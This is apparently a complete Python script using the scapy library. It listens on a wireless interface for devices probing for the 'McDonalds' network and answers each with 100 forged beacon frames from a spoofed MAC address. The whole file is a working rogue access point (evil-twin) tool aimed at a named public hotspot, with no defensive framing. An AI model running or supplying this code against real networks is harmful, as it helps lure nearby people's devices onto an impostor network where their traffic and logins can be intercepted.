#! /usr/bin/env python
from scapy.all import *

# SSID to target
SSID='McDonalds'
# interface name, check using iwconfig
interface = "wlan0"

def callback(packet):
    '''Process the Probe request packet in parameter to extract various informations'''
    if packet.haslayer(Dot11ProbeReq):
        # extract the MAC address of the sender
        sender = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        
        if ssid == SSID:
            print("Found a probe request for SSID " + SSID + " by client with MAC " + sender)
            # generate beacon frame
            dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33')
            essid = Dot11Elt(ID='SSID',info=SSID, len=len(SSID))

            frame = RadioTap()/dot11/Dot11Beacon()/essid
            # send the beacon frame 100 times with inter time 0.1s
            print("Broadcasting beacons with SSID " + SSID)
            sendp(frame, inter=0.1, count=100, iface=interface, verbose=1)

# start sniffing
print("Scanning looking for Probe Request of SSID " + SSID + " for 10 seconds...")
sniff(prn=callback, iface=interface, timeout=10)
